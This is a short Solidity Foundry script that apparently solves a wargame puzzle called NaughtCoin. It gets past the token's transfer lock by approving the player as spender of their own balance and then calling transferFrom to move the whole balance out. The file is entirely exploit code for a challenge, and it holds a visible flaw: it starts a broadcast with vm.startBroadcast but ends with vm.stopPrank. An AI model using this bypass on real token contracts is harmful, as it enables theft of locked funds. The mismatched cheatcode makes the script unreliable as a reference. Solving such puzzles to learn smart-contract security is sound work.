// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "@puzzles/15/NaughtCoin.sol";

contract NaughtCoinSolution is Script {
    function run(address target) external {
        solve(target, msg.sender);
    }

    function solve(address target, address player) public {
        NaughtCoin puzzleContract = NaughtCoin(target);
        uint256 playerBalance = puzzleContract.balanceOf(player);

        vm.startBroadcast();
        puzzleContract.approve(player, playerBalance);
        puzzleContract.transferFrom(player, address(puzzleContract), playerBalance);
        vm.stopPrank();
    }
}
